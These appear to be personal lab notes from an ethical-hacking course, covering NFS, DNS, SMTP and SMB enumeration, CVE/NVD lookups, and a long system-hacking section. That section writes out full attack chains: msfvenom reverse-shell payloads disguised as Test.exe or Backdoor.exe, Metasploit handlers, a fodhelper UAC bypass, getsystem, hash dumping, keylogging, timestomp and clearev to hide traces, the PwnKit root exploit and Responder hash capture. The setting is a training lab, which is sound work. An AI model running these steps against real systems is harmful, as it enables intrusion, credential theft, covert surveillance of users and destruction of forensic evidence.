You may enter multiple IP addresses in the Target.txt file. However, in this task we are targeting only one machine, the Windows Server 2019 (10.10.1.19).

./superenum and press Enter. Under Enter IP List filename with path, type Target.txt, and press Enter.

If you get an error running the ./superenum script, type chmod +x superenum and press Enter, then repeat Step 16.

The script starts scanning the target IP address for open NFS and other.

The scan will take approximately 15-20 mins to complete.

After the scan is finished, scroll down to review the results. Observe that the port 2049 is open and the NFS service is running on it.

You can also observe the other open ports and the services running on them.

In the terminal window, type cd .. and press Enter to return to the root directory.

Now, we will perform NFS enumeration using RPCScan. To do so, 

cd RPCScan and press Enter

python3 rpc-scan.py [Target IP address] --rpc (in this case, the target IP address is 10.10.1.19, the Windows Server 2019 machine); press Enter.

--rpc: lists the RPC (portmapper).

########
Lab 5: DNS Enum
########

========
Perform DNS Enumeration using Zone Transfer
========

ParrotOS

dig ns [Target Domain] (in this case, the target domain is www.certifiedhacker.com); press Enter.

In this command, ns returns name servers in the result

The above command retrieves information about all the DNS name servers of the target domain and displays it in the ANSWER SECTION

On Linux-based systems, the dig command is used to query the DNS name servers to retrieve information about target host addresses, name servers, mail exchanges, etc.

dig @[[NameServer]] [[Target Domain]] axfr (in this example, the name server is ns1.bluehost.com and the target domain is www.certifiedhacker.com); press Enter.

In this command, axfr retrieves zone information.

The result appears, displaying that the server is available, but that the Transfer failed

========
Perform DNS Enumeration using DNSSEC Zone Walking
========

ParrotOS

cd dnsrecon and press Enter to enter in to dnsrecon directory.

chmod +x ./dnsrecon.py in the terminal and press Enter.

./dnsrecon.py -d [Target domain] -z (here, the target domain is www.certifiedhacker.com); press Enter.

In this command, -d specifies the target domain and -z specifies that the DNSSEC zone walk be performed with standard enumeration.

The result appears, displaying the enumerated DNS records for the target domain. In this case, DNS record file A is enumerated

Using the DNSRecon tool, the attacker can enumerate general DNS records for a given domain (MX, SOA, NS, A, AAAA, SPF, and TXT). These DNS records contain digital signatures based on public-key cryptography to strengthen authentication in DNS.

This concludes the demonstration of performing DNS Enumeration using DNSSEC zone walking.

You can also use other DNSSEC zone enumerators such as LDNS (https://www.nlnetlabs.nl), nsec3map (https://github.com), nsec3walker (https://dnscurve.org), and DNSwalk (https://github.com) to perform DNS enumeration on the target domain.

========
Perform DNS Enumeration using Nmap
========

ParrotOS

nmap --script=broadcast-dns-service-discovery [Target Domain] and press Enter (here, the target domain is certifiedhacker.com).

The result appears displaying a list of all the available DNS services on the target host along with their associated ports

nmap -T4 -p 53 --script dns-brute [Target Domain] and press Enter (here the target domain is certifiedhacker.com).

-T4: specifies the timing template, -p: specifies the target port.

The result appears displaying a list of all the subdomains associated with the target host along with their IP addresses

nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='[Target Domain]'” (here, the target domain is certifiedhacker.com).

The result appears displaying various common service (SRV) records for a given domain name

========
SMTP enum using NMAP
========

ParrotOS

nmap -p 25 --script=smtp-enum-users [Target IP Address] and press Enter, (here, the target IP address is 10.10.1.19).

-p: specifies the port, and –script: argument is used to run a given script (here, the script is smtp-enum-users).

The result appears displaying a list of all the possible mail users on the target machine (10.10.1.19),

nmap -p 25 --script=smtp-open-relay [Target IP Address] and press Enter, (here, the target IP address is 10.10.1.19).

-p: specifies the port, and –script: argument is used to run a given script (here, the script is smtp-open-relay).

The result appears displaying a list of open SMTP relays on the target machine (10.10.1.19)

nmap -p 25 --script=smtp-commands [Target IP Address] and press Enter, (here, the target IP address is 10.10.1.19).

-p: specifies the port, and –script: argument is used to run a given script (here, the script is smtp-commands).

A list of all the SMTP commands available in the Nmap directory appears. You can further explore the commands to obtain more information on the target host.

########
Lab 7
########
========
Perform RPC, SMB, and FTP Enumeration using Nmap
========


====
FTP & RPC
====
Windows Server 2019

Go to IIS and add FTP Site CEH.com with no SSL and bind it to 10.10.1.19

ParrotOS

nmap -p 21 [Target IP Address] (in this case, 10.10.1.19) and press Enter.

The scan result appears, indicating that port 21 is open and the FTP service is running on it,

nmap -T4 -A [Target IP Address] (here, the target IP address is 10.10.1.19) and press Enter.

In this command, -T4: specifies the timing template (the number can be 0-5) and -A: specifies aggressive scan. The aggressive scan option supports OS detection (-O), version scanning (-sV), script scanning (-sC), and traceroute (--traceroute).

The scan result appears, displaying information regarding open ports, services along with their versions. You can observe the RPC service and NFS service running on the ports 111 and 2049, respectively


====
SMB
====

nmap -p [Target Port] -A [Target IP Address] (in this example, the target port is 445 and the target IP address is 10.10.1.19) and press Enter.

In this command, -p: specifies the port to be scanned, and -A: specifies aggressive scan. The aggressive scan option supports OS detection (-O), version scanning (-sV), script scanning (-sC), and traceroute (--traceroute).

The scan result appears, displaying that port 445 is open, and giving detailed information under the Host script results section about the running SMB

====
FTP
====

nmap -p [Target Port] -A [Target IP Address] (in this example, the target port is 21 and target IP address is 10.10.1.19) and press Enter.

In this command, -p specifies the port to be scanned and -A specifies aggressive scan. The aggressive scan option supports OS detection (-O), version scanning (-sV), script scanning (-sC), and traceroute (--traceroute).

The scan result appears, displaying that port 21 is open, and giving traceroute information

########
Lab 8 - Perform Enumeration using Various Enumeration Tools
########

-All BS tools.

########
Module 5 - Vulnerability Analysis
########
========
Lab 1 - Perform Vulnerability Research with Vulnerability Scoring Systems and Databases
========

====
CWE
====

Windows 11

Go to https://cwe.mitre.org/

CWE website appears. Click on Search tab, in the Google Custom Search under Search CWE section, type SMB and click the search icon.

Here, we are searching for the vulnerabilities of the running services that were found in the target systems in previous module labs (Module 04 Enumeration).

The search results appear, displaying the underlying vulnerabilities in the target service (here, SMB). You can click any link to view detailed information on the vulnerability.

The search results might differ when you perform this task

Now, click any link (here, CWE-284) to view detailed information about the vulnerability.

A new webpage appears in the new tab, displaying detailed information regarding the vulnerability. You can scroll-down further to view more information.

Now click on Home, then click on CWE List

A new webpage appears, displaying CWE List Version. Scroll down, and under the External Mappings section, click CWE Top 25 (2021).

The result might differ when you perform this task.

A webpage appears, displaying CWE VIEW: Weaknesses in the 2021 CWE Top 25 Most Dangerous Software Weaknesses. Scroll down and view a list of Weaknesses in the 2021 CWE Top 25 Most Dangerous Software Weaknesses under the Relationships section. You can click on each weakness to view detailed information on it.

This information can be used to exploit the vulnerabilities in the software and further launch attacks.

The result showing publishing year might differ when you perform this task.

Similarly, you can go back to the CWE website and explore other options, as well.

Attacker can find vulnerabilities on the services running on the target systems and further exploit them to launch attacks.

This concludes the demonstration of checking vulnerabilities in the Common Weakness Enumeration (CWE).

Close all open windows and document all the acquired information.

====
CVE
====

Windows 11

https://cve.mitre.org/

You can copy the name of any vulnerability under the Newest CVE Entries section and search on CVE to view detailed information on it.

Now, click on the Search CVE List tab. Under Search CVE List section, type the vulnerability name (here, CVE-2021-4034) in the search bar, and click Submit.

Search Results page appears, displaying the information regarding the searched vulnerability. You can click the vulnerability link to view further detailed information regarding the vulnerability.

We will exploit this vulnerability in Module 06 System Hacking to gain access to the target system.

Click on Search CVE List at the top of the browser window under Search CVE List section, type the vulnerability name (here, CVE-2021-44228) in the search bar, and click Submit

Search Results page appears, displaying the records that match the search, click on CVE-2021-44228 link to view the details of the vulnerability.

CVE-2021-44228 page appears displaying the information regarding the searched vulnerability.

We will exploit this vulnerability in Module 14 Hacking Web Applications to gain access to the target system.

Similarly, in the Search CVE List section, you can search for a service-related vulnerability by typing the service name (here, SMB) and click Submit.

You can search for the vulnerabilities of the running services that were found in the target systems in previous module labs (Module 04 Enumeration).


Search Results page appears, displaying a list of vulnerabilities in the target service (SMB) along with their description, as shown in the screenshot.

The result might differ when you perform this task.

Further, you can click on CVE-ID of any vulnerability to view its detailed information. Here, we will click on the first CVE-ID link.

Detailed information regarding the vulnerability is displayed such as its Description, References, and Date Record Created. Further, you can click on links under the References section to view more information on the vulnerability.

====
NVD
====

Windows 11

https://nvd.nist.gov

You can click on the CVE-ID link (here, CVE-2022-0729) to view detailed information about the vulnerability.

The result might differ when you perform this task.

A new webpage appears, displaying CVE-2022-0729 Detail. You can view detailed information such as Current Description, Severity, References, and Weakness Enumeration.

Under the Severity section, click the Base Score link to view the CVSS details regarding the vulnerability.

A new webpage appears, displaying information such as Base Scores, Temporal Score, and Environmental Score Overall Score related to a vulnerability in graphical form, under Common Vulnerability Scoring System Calculator CVE-2022-0729.

Base Score: The metric most relied upon by enterprises and deals with the inherent qualities of a vulnerability. The table below describes the severity of a vulnerability depending upon the Base Score range:

Temporal Score: Represents the qualities of the vulnerability that change over time, and the Environmental score represents the qualities of the vulnerability that are specific to the affected user's environment.

Overall Score: Sum total of both the scores (CVSS Base Score, CVSS Temporal Score).

Scroll down to view more detailed information on different score metrics such as Base Score Metrics, Temporal Score Metrics, and Environmental Score Metrics.

The results might differ depending upon the selected vulnerability

Now, navigate back to the main page of the NATIONAL VULNERABILITY DATABASE website. Expand Vulnerabilities and click Search & Statistics option, as shown in the screenshot.

Search Vulnerability Database page appears. In the Keyword Search field, type a target service (here, SMB) to find vulnerabilities associated with it and click Search.

You can search for the vulnerabilities of the running services that were found in the target systems in previous module labs (Module 04 Enumeration).

The Search Results page appears, displaying detailed information on the underlying vulnerabilities in the target service.

You can further view detailed information on each vulnerability by clicking on the Vuln ID link.

########
Module 6 - System Hacking - just repeat many times
########

========
Lab 1 - Gain access
========

Running responder on Ubuntu

cd Responder

chmod +x ./Responder.py

sudo python2 ./Responder.py -I eth0

-I: specifies the interface (here, eth0). However, the network interface might be different in your machine, to check the interface issue ifconfig command.

Responder starts listening to the network interface for events

Now, attempt to crack the hashes to learn the password of the logged-in user (here, Jason).

To crack the password hash, the John the Ripper tool must be installed on your system. To install the tool, open a new Terminal window, type sudo snap install john-the-ripper, and press Enter.

In the password for ubuntu field, type toor and press Enter to install the John the Ripper tool.

sudo john /home/ubuntu/Responder/logs/[Log File Name.txt] and press Enter.

Here, the log file name is SMB-NTLMv2-SSP-10.10.1.11.txt.

John the Ripper starts cracking the password hashes and displays the password in plain text

========
Task 2: Audit System Passwords using L0phtCrack
========

open the L0phtCrack software and audit the computer using the admin creds.

========
Task 3: Find Vulnerabilities on Exploit Sites
========

https://www.exploit-db.com/

The Exploit Database website appears; you can click any of the latest vulnerabilities to view detailed information, or you can search for a specific vulnerability by entering its name in the Search field.

You can similarly use other exploit sites such as VulDB (https://vuldb.com), MITRE CVE (https://cve.mitre.org), Vulners (https://vulners.com), and CIRCL CVE Search (https://cve.circl.lu) to find target system vulnerabilities.

========
Task 4: Exploit Client-Side Vulnerabilities and Establish a VNC Session
========

ParrotOS

msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/attacker/Desktop/Test.exe and press Enter.

Here, the IP address of the host machine is 10.10.1.13 (Parrot Security machine).

this creates a test.exe on the desktop. Now share it with the target.

Type mkdir /var/www/html/share and press Enter to create a shared folder
Type chmod -R 755 /var/www/html/share and press Enter
Type chown -R www-data:www-data /var/www/html/share and press Enter
Copy the malicious file to the shared location by typing cp /home/attacker/Desktop/Test.exe /var/www/html/share and pressing Enter
Here, we are sending the malicious payload through a shared directory; but in real-time, you can send it via an attachment in an email or through physical means such as a hard drive or pen drive.

Now, start the apache service. To do this, type 

service apache2 start

msfconsole

this opens the metasploit console.

In msfconsole, type use exploit/multi/handler and press Enter.

Now, set the payload, LHOST, and LPORT. To do so, use the below commands:

Type set payload windows/meterpreter/reverse_tcp and press Enter
Type set LHOST 10.10.1.13 and press Enter
Type set LPORT 444 and press Enter

After entering the above details, type exploit and press Enter to start the listener.

Click Windows 11 to switch to the Windows 11 machine.

Open any web browser (here, Mozilla Firefox). In the address bar place your mouse cursor, type http://10.10.1.13/share and press Enter. As soon as you press enter, it will display the shared folder contents, as shown in the screenshot.

Click Test.exe to download the file.

Run the Test.exe file

Swap to ParrotOS to see the reverse shell.

Type sysinfo and press Enter to verify that you have hacked the targeted Windows 11.

If the Meterpreter shell is not automatically connected to the session, type sessions -i 1 and press Enter to open a session in Meterpreter shell.

Now, type upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1 and press Enter. This command uploads the PowerSploit file (PowerUp.ps1) to the target system’s present working directory.

PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.

Type shell and press Enter to open a shell session. Observe that the present working directory points to the Downloads folder in the target system.

Type powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks” and press Enter to run the PowerUp.ps1 file.

Ensure that you have added a space between two dots after -Command “.[space].. For a better understanding refer to the screenshot after step 25.

A result appears, displaying Check and AbuseFunction

10.10.1.13 is the IP address of the host machine (here, the Parrot Security machine).

Attackers exploit misconfigured services such as unquoted service paths, service object permissions, unattended installs, modifiable registry autoruns and configurations, and other locations to elevate access privileges. After establishing an active session using Metasploit, attackers use tools such as PowerSploit to detect misconfigured services that exist in the target OS.

Now, type exit and press Enter to revert to the Meterpreter session.

Now, exploit VNC vulnerability to gain remote access to the Windows 11 machine. To do so, type run vnc and press Enter.

This will open a VNC session for the target machine, as shown in the screenshot. Using this session, you can see the victim’s activities on the system, including the files, websites, software, and other resources the user opens or runs.

========
Task 5: Gain Access to a Remote System using Armitage
========

ParrotOS

service postgresql start

Click Applications in the top-left corner of Desktop and navigate to Pentesting --> Exploitation Tools --> Metasploit Framework --> armitage to launch the Armitage tool.

Click on Hosts from the Menu bar and navigate to Nmap Scan --> Intense Scan to scan for live hosts in the network.

Now, from the left-hand pane, expand the payload node, and then navigate to windows --> meterpreter; double-click meterpreter_reverse_tcp.

The windows/meterpreter_reverse_tcp window appears. Scroll down to the LPORT Option, and change the port Value to 444. In the Output field, select exe from the drop-down options; click Launch.

In the previous lab, we already created a directory or shared folder (share) at the location (/var/www/html) with the required access permission. So, we will use the same directory or shared folder (share) to share malicious_payload.exe with the victim machine.

If you want to create a new directory to share the malicious_payload.exe file with the target machine and provide the permissions, use the below commands:

Type mkdir /var/www/html/share and press Enter to create a shared folder
Type chmod -R 755 /var/www/html/share and press Enter
Type chown -R www-data:www-data /var/www/html/share and press Enter
In the Terminal window, type cp /root/Desktop/malicious_payload.exe /var/www/html/share/, and press Enter to copy the file to the shared folder.

Type service apache2 start and press Enter to start the Apache server.

########
Lab 2: Perform Privilege Escalation to Gain Higher Privileges
########

ParrotOS

msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Exploit.exe and press Enter.

Here, the IP address of the host machine is 10.10.1.13 (here, this IP is the Parrot Security machine).

Now, we need to share Exploit.exe with the victim machine. (In This task, we are using Windows 11 as the victim machine).

In the previous lab, we already created a directory or shared folder (share) at the location (/var/www/html) with the required access permission. So, we will use the same directory or shared folder (share) to share Exploit.exe with the victim machine.

If you want to create a new directory to share the Exploit.exe file with the target machine and provide the permissions, use the below commands:

Type mkdir /var/www/html/share and press Enter to create a shared folder
Type chmod -R 755 /var/www/html/share and press Enter
Type chown -R www-data:www-data /var/www/html/share and press Enter
Here, we are sending the malicious payload through a shared directory; but in real-time, you can send it as an email attachment or through physical means such as a hard drive or pen drive.

Type ls -la /var/www/html/ | grep share and press Enter.

To copy the Exploit.exe file into the shared folder, type cp /home/attacker/Desktop/Exploit.exe /var/www/html/share/ and press Enter.

Type service apache2 start and press Enter to start the Apache server.


Now, type msfconsole in the terminal and press Enter to launch the Metasploit framework.

Type use exploit/multi/handler and press Enter to handle exploits launched outside the framework.

Now, issue the following commands in msfconsole:

Type set payload windows/meterpreter/reverse_tcp and press Enter to set a payload.

Type set LHOST 10.10.1.13 and press Enter to set the localhost.

To start the handler, type the command exploit -j -z and press Enter.

In the Terminal window, you can see that the Meterpreter session has successfully been opened.

Type sessions -i 1 and press Enter (here, 1 is the id number of the session). Meterpreter shell is launched, as shown in the screenshot.

Type getuid and press Enter. This displays the current user ID, as shown in the screenshot.

Now that you have gained access to the target system with normal user privileges, your next task is to perform privilege escalation to attain higher-level privileges in the target system.

First, we will use privilege escalation tools (BeRoot), which allow you to run a configuration assessment on a target system to find out information about its underlying vulnerabilities, services, file and directory permissions, kernel version, architecture, as well as other data. Using this information, you can find a way to further exploit and elevate the privileges on the target system.

Now, we will copy the BeRoot tool on the host machine (Parrot Security), and then upload the tool onto the target machine (Windows 11) using the Meterpreter session.

Minimize the Terminal window. Click the Places menu at the top of Desktop and click ceh-tools on 10.10.1.11 from the drop-down options.

If ceh-tools on 10.10.1.11 option is not present then follow the below steps to access CEH-Tools folder:

Click the Places menu present at the top of the Desktop and select Network from the drop-down options
The Network window appears; press Ctrl+L. The Location field appears; type smb://10.10.1.11 and press Enter to access Windows 11 shared folders.
The security pop-up appears; enter the Windows 11 machine credentials (Username: Admin and Password: Pa$$w0rd) and click Connect.
The Windows shares on 10.10.1.11 window appears; double-click the CEH-Tools folder.

Now, switch back to the Terminal window with an active meterpreter session. Type upload /home/attacker/Desktop/BeRoot/beRoot.exe and press Enter. This command uploads the beRoot.exe file to the target system’s present working directory (here, Downloads).

Type shell and press Enter to open a shell session. Observe that the present working directory points to the Downloads folder in the target system.

Type beRoot.exe and press Enter to run the BeRoot tool.

A result appears, displaying information about service names along with their permissions, keys, writable directories, locations, and other vital data.

You can further scroll down to view the information related to startup keys, task schedulers, WebClient vulnerabilities, and other items.

You can find further vulnerabilities in the resulting services and attempt to exploit them to escalate your privileges in the target system.

Windows privileges can be used to escalated privileges. These privileges include SeDebug, SeRestore & SeBackup & SeTakeOwnership, SeTcb & SeCreateToken, SeLoadDriver, and SeImpersonate & SeAssignPrimaryToken. BeRoot lists all available privileges and highlights if you have one of these tokens.

Now we will use GhostPack Seatbelt tool to gather host information and perform security checks to find insecurities in the target system.

Minimize the Terminal window. Click the Places menu at the top of Desktop and click ceh-tools on 10.10.1.11 from the drop-down options.

If ceh-tools on 10.10.1.11 option is not present then follow the below steps to access CEH-Tools folder:

Click the Places menu present at the top of the Desktop and select Network from the drop-down options
The Network window appears; press Ctrl+L. The Location field appears; type smb://10.10.1.11 and press Enter to access Windows 11 shared folders.
The security pop-up appears; enter the Windows 11 machine credentials (Username: Admin and Password: Pa$$w0rd) and click Connect.
The Windows shares on 10.10.1.11 window appears; double-click the CEH-Tools folder.
CEH-Tools folder appears, navigate to CEHv12 Module 06 System Hacking\Github Tools and copy Seatbelt.exe file. Paste the copied file onto Desktop.

In the terminal type upload /home/attacker/Desktop/Seatbelt.exe and press Enter to upload Seatbelt.exe into the target system.

Type shell and press Enter to open a shell session. Observe that the present working directory points to the Downloads folder in the target system.

Type Seatbelt.exe -group=system and press Enter to gather information about AMSIProviders, AntiVirus, AppLocker etc.

Type Seatbelt.exe -group=user and press Enter to gather information about ChromiumPresence, CloudCredentials, CloudSyncProviders, CredEnum, dir, DpapiMasterKeys etc.

Type Seatbelt.exe -group=misc and press Enter to gather information about ChromiumBookmarks, ChromiumHistory, ExplicitLogonEvents, FileInfo etc.

Apart from the aforementioned Seatbelt commands, you can also use the following advanced commands to gather more information regarding the target system:


Another method for performing privilege escalation is to bypass the user account control setting (security configuration) using an exploit, and then to escalate the privileges using the Named Pipe Impersonation technique.

Now, let us check our current system privileges by executing the run post/windows/gather/smart_hashdump command.

You will not be able to execute commands (such as hashdump, which dumps the user account hashes located in the SAM file, or clearev, which clears the event logs remotely) that require administrative or root privileges.

The command fails to dump the hashes from the SAM file located on the Windows 11 machine and returns an error stating Insufficient privileges to dump hashes!.

From this, it is evident that the Meterpreter session requires admin privileges to perform such actions.

Now, we shall try to escalate the privileges by issuing a getsystem command that attempts to elevate the user privileges.

The command issued is:

getsystem -t 1: Uses the service – Named Pipe Impersonation (In Memory/Admin) Technique.
The command fails to escalate privileges and returns an error stating Operation failed.

From the result, it is evident that the security configuration of the Windows 11 machine is blocking you from gaining unrestricted access to it.

Now, we shall try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.

In this task, we will bypass Windows UAC protection via the FodHelper Registry Key. It is present in Metasploit as a bypassuac_fodhelper exploit.

Type background and press Enter. This command moves the current Meterpreter session to the background.

Now, we will use the bypassuac_fodhelper exploit for windows. To do so, type use exploit/windows/local/bypassuac_fodhelper and press Enter.

Here, you need to configure the exploit. To know which options you need to configure in the exploit, type show options and press Enter. The Module options section appears, displaying the requirement for the exploit. Observe that the SESSION option is required, but the Current Setting is empty.

Type set SESSION 1 (1 is the current Meterpreter session which is running in the background) and press Enter.

Now that we have configured the exploit, our next step will be to set and configure a payload. To do so, type set payload windows/meterpreter/reverse_tcp and press Enter. This will set the meterpreter/reverse_tcp payload.

The next step is to configure this payload. To see all the options, you need to configure in the exploit, type show options and press Enter.

The Module options section appears, displaying the previously configured exploit. Here, observe that the session value is set.

The Payload options section displays the requirement for the payload.

Observe that:

The LHOST option is required, but Current Setting is empty (here, you need to set the IP Address of the local host, (here, the Parrot Security machine)
The EXITFUNC option is required, but Current Setting is already set to process, so ignore this option
The LPORT option is required, but Current Setting is already set to port number 4444, so ignore this option

To set the TARGET option, type set TARGET 0 and press Enter (here, 0 indicates nothing, but the Exploit Target ID).

In This task, 10.10.1.13 is the IP Address of the attacker machine (here, Parrot Security).

You have successfully configured the exploit and payload. Type exploit and press Enter. This begins to exploit the UAC settings on the Windows 11 machine.

As you can see, the BypassUAC exploit has successfully bypassed the UAC setting on the Windows 11 machine; you have now successfully completed a Meterpreter session.

Now, let us check the current User ID status of Meterpreter by issuing the getuid command. You will observe that the Meterpreter server is still running with normal user privileges.

At this stage, we shall re-issue the getsystem command with the -t 1 switch to elevate privileges. To do so, type getsystem -t 1 and press Enter.

If the command getsystem -t 1 does not run successfully, issue the command getsystem.

This time, the command successfully escalates user privileges and returns a message stating got system, as shown in the screenshot.

In Windows OSes, named pipes provide legitimate communication between running processes. You can exploit this technique to escalate privileges on the victim system to utilize a user account with higher access privileges.

Now, type getuid and press Enter. The Meterpreter session is now running with system privileges (NT AUTHORITY\SYSTEM), as shown in the screenshot.

Let us check if we have successfully obtained the SYSTEM/admin privileges by issuing a Meterpreter command that requires these privileges in order to execute.

Now, we shall try to obtain password hashes located in the SAM file of the Windows 11 machine.

Type the command run post/windows/gather/smart_hashdump and press Enter. This time, Meterpreter successfully extracts the NTLM hashes and displays them, as shown in the screenshot.

You can further crack these password hashes to obtain plaintext passwords.

Thus, you have successfully escalated privileges by exploiting the Windows 11 machine’s vulnerabilities.

You can now remotely execute commands such as clearev to clear the event logs that require administrative or root privileges. To do so, type clearev and press Enter.

========
Task 2: Hack a Windows Machine using Metasploit and Perform Post-Exploitation using Meterpreter
========

ParrotOS

msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.1.13 -f exe > /home/attacker/Desktop/Backdoor.exe and press Enter.

Here, the localhost IP address is 10.10.1.13 (the Parrot Security machine).

his will generate Backdoor.exe, a malicious file, on /home/attacker/Desktop, as shown in the screenshot.

To navigate to the Desktop, click Places from the top-section of the Desktop and click Home Folder from the drop-down options. The attacker window appears, click Desktop.

Screenshot

Now, you need to share Backdoor.exe with the target machine (in This task, Windows 11).

In the previous lab, we created a directory or shared folder (share) at the location (/var/www/html) and with the required access permission. We will use the same directory or shared folder (share) to share Backdoor.exe with the victim machine.

If you want to create a new directory to share the Backdoor.exe file with the target machine and provide the permissions, use the below commands:

Type mkdir /var/www/html/share and press Enter to create a shared folder
Type chmod -R 755 /var/www/html/share and press Enter
Type chown -R www-data:www-data /var/www/html/share and press Enter
Type cp /home/attacker/Desktop/Backdoor.exe /var/www/html/share/ and press Enter to copy the file to the share folder.

To share the file, you need to start the Apache server. Type the command service apache2 start and press Enter.

Now, type the command msfconsole and press Enter to launch Metasploit.

Type use exploit/multi/handler and press Enter to handle exploits launched outside of the framework.

Now, issue the following commands in msfconsole:

Type set payload windows/meterpreter/reverse_tcp and press Enter
Type set LHOST 10.10.1.13 and press Enter
Type show options and press Enter; this lets you know the listening port

Click Windows 11 to switch to the Windows 11 machine.

Open any web browser (here, Mozilla Firefox). In the address bar place your mouse cursor, type http://10.10.1.13/share and press Enter. As soon as you press enter, it will display the shared folder contents, as shown in the screenshot.

Click Backdoor.exe to download the file.

Screenshot

Once you click on the Backdoor.exe file, the Opening Backdoor.exe pop-up appears; select Save File.

Make sure that both the Backdoor.exe and Secret.txt files are stored in the same directory (here, Downloads).

Double-click the Backdoor.exe file. The Open File - Security Warning window appears; click Run.

Screenshot

Leave the Windows 11 machine running and click Parrot Security to switch to the Parrot Security machine.

The Meterpreter session has successfully been opened, as shown in the screenshot.

Type sessions -i 1 and press Enter (here, 1 specifies the ID number of the session). The Meterpreter shell is launched, as shown in the screenshot.

Type sysinfo and press Enter. Issuing this command displays target machine information such as computer name, OS, and domain.

Screenshot

Type ipconfig and press Enter. This displays the victim machine’s IP address, MAC address, and other information.

Screenshot

Type getuid and press Enter to display that the Meterpreter session is running as an administrator on the host.

Type pwd and press Enter to view the current working directory on the victim machine.

The current working directory will differ according to where you have saved the Backdoor.exe file; therefore, the images on the screen might differ in your lab environment.

o read the contents of a text file, type cat [filename.txt] (here, Secret.txt) and press Enter.

Screenshot

Now, we will change the MACE attributes of the Secret.txt file.

While performing post-exploitation activities, an attacker tries to access files to read their contents. Upon doing so, the MACE (modified, accessed, created, entry) attributes immediately change, which indicates to the file user or owner that someone has read or modified the information.

To leave no trace of these MACE attributes, use the timestomp command to change the attributes as you wish after accessing a file.

To view the mace attributes of Secret.txt, type 

timestomp Secret.txt -v and press Enter. 

This displays the created time, accessed time, modified time, and entry modified time, as shown in the screenshot.

To change the MACE value, 

type timestomp Secret.txt -m “02/11/2018 08:10:03” and press Enter. 

This command changes the Modified value of the Secret.txt file.

-m: specifies the modified value.

Similarly, you can change the Accessed (-a), Created (-c), and Entry Modified (-e) values of a particular file.

The cd command changes the present working directory. As you know, the current working directory is C:\Users\Admin\Downloads. Type cd C:/ and press Enter to change the current remote directory to C.

Now, type pwd and press Enter and observe that the current remote directory has changed to the C drive.

Screenshot

You can also use a search command that helps you to locate files on the target machine. This type of command is capable of searching through the whole system or can be limited to specific folders.

Type search -f [Filename.extension] (here, pagefile.sys) and press Enter. This displays the location of the searched file.

Now that you have successfully exploited the system, you can perform post-exploitation maneuvers such as key-logging. Type keyscan_start and press Enter to start capturing all keyboard input from the target system.

type keyscan_dump, and press Enter. This dumps all captured keystrokes.

Screenshot

Type idletime and press Enter to display the amount of time for which the user has been idle on the remote system.

Screenshot

Type shell and press Enter to open a shell in meterpreter.

Type dir /a:h and press Enter, to retrieve the directory names with hidden attributes.

Type sc queryex type=service state=all and press Enter, to list all the available services

Now, we will list details about specific service, to do that 

type netsh firewall show state and press Enter, 

to display current firewall state.

Type netsh firewall show config and press Enter to view the current firewall settings in the target system.

Type wmic /node:"" product get name,version,vendor and press Enter to view the details of installed software.

Type wmic cpu get and press Enter, to retrieve the processor’s details.

Type wmic useraccount get name,sid and press Enter, to retrieve login names and SIDs of the users.

Type wmic os where Primary='TRUE' reboot and press Enter, to reboot the target system.

Apart from the aforementioned post exploitation commands, you can also use the following additional commands to perform more operations on the target system:

2022-04-11_16-40-55.jpg

Observe that the Meterpreter session also dies as soon as you shut down the victim machine.

Screenshot

Click Windows 11 to switch to the Windows 11 machine (victim machine).

You can observe that the machine has been turned off.

Screenshot

This concludes the demonstration of how to hack Windows machines using Metasploit and perform post-exploitation using Meterpreter.

Close all open windows and document all the acquired information.

Click Parrot Security tp switch to Parrot Security machine. Restart Parrot Security machine. To do that click Menu button at the bottom left of the Desktop, from the menu and click Turn off the device icon. A Shut down this system now? pop-up appears, click on Restart button.

========
Privilege esc on linux
========

ParrotOS

whoami //you should be a non-root account

type mkdir /tmp/pwnkit and press Enter.

type mv CVE-2021-4034 /tmp/pwnkit/ and press Enter.

type cd /tmp and press Enter to navigate to tmp directory.

Type cd pwnkit and press Enter to navigate into pwnkit folder.

Type cd CVE-2021-4034/ and press Enter to navigate into CVE-2021-4034 folder.

In the CVE-2021-4034 directory, type make and press Enter.

type ./cve-2021-4034 and press Enter.

in the new shell: type whoami and press enter

you are now root.

========
Task 4: Escalate Privileges in Linux Machine by Exploiting Misconfigured NFS
========

Ubuntu

Terminal

In the terminal window to install NFS service type sudo apt-get update and press Enter. Ubuntu will ask for the password; type toor as the password and press Enter.

The password that you type will not be visible in the terminal window.

Now in the terminal type sudo apt install nfs-kernel-server and press Enter.

If Do you want to continue? question appears enter Y and press Enter.

In the terminal type sudo nano /etc/exports and press Enter to open /etc/exports file.

/etc/exports file holds a record for each directory that user wants to share within a network machine.

A nano editor window appears, in the window type /home *(rw,no_root_squash) and press Ctrl+S to save it and Ctrl+x to exit the editor window.

/home *(rw,no_root_squash) entry shows that /home directory is shared and allows the root user on the client to access files and perform read/write operations. * sign denotes connection from any host machine.

We must restart the nfs server to apply the configuration changes.

In the terminal, type sudo /etc/init.d/nfs-kernel-server restart and press Enter to restart NFS server.

We have successfully configured the NFS server in the victim machine.

Click Parrot Security to switch to Parrot Security machine and launch a terminal window.

In the terminal window, type nmap -sV 10.10.1.9 and press Enter, to perform an Nmap scan.

We can see that the port 2049 is open and nfs service is running on it.

In the terminal window, type sudo apt-get install nfs-common and press Enter.

In the [sudo] password for attacker field, type toor as a password and press Enter.

If Do you want to continue? question appears enter Y and press Enter.

Now type showmount -e 10.10.1.9 and press Enter, to check if any share is available for mount in the target machine.

If you receive clnt_create: RPC: Program not registered error, switch to Ubuntu machine:

Restart the machine by clicking on Thunder icon and navigate to Power --> Reset/Reboot Machine, in the pop-up window select Yes.
After reboot, restart the nfs services by typing sudo /etc/init.d/nfs-kernel-server restart and press Enter in the terminal.
Switch to Parrot Security Machine and run step 15 again.

Now, type mkdir /tmp/nfs and press Enter to create nfs directory.

